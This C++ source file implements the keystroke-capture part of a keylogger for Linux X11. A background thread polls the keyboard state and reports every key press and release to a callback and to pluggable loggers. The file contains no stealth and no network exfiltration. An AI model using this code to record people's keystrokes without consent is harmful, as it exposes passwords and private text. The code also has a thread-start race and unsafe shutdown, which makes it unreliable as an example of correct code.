#ifdef __linux__

#include "KeystrokeCapturerLinuxX11.h"

#include <cstring>

namespace Keylogger {

bool KeystrokeCapturerLinuxX11::start() {
    _display = XOpenDisplay(NULL);
    if (_display != NULL) {
        _thread = new std::thread(&KeystrokeCapturerLinuxX11::_keystrokeListener, this);
        _threadRun = true;
    }
    return _display != NULL;
}

void KeystrokeCapturerLinuxX11::stop() {
    _threadRun = false;
    XCloseDisplay(_display);
}

void KeystrokeCapturerLinuxX11::consumeKeystrokes(bool consume) {
    _consumeKeystrokes = consume;
}

void KeystrokeCapturerLinuxX11::setCallback(std::function<void(int keycode, KeyState state)> callback) {
    _callback = callback;
}

void KeystrokeCapturerLinuxX11::addLogger(ILogger* logger) {
    _loggers.push_back(logger);
}

void KeystrokeCapturerLinuxX11::_keystrokeListener() {
    char keys[32];
    char lastKeys[32] = {0};

    while (_threadRun) {
        XQueryKeymap(_display, keys);

        for (int i = 0; i < 32; i++) {
            char bit = keys[i];
            char lastBit = lastKeys[i];
            int check = 1;

            if (bit == lastBit) {
                continue;
            }

            for (int j = 0 ; j < 8 ; j++) {
                if ((bit & check) != (lastBit & check)) {
                    int keysym = XKeycodeToKeysym(_display, (i << 3) + j, 0);
                    KeyState state = (bit & check) ? KeyState::Pressed : KeyState::Released;

                    if (_callback) {
                        _callback(keysym, state);
                    }

                    for (ILogger* logger : _loggers) {
                        logger->logKeycode(keysym, state);
                    }
                }
                check <<= 1;
            }
        }
        memcpy(lastKeys, keys, 32);
    }
}

}

#endif // defined(__linux__)
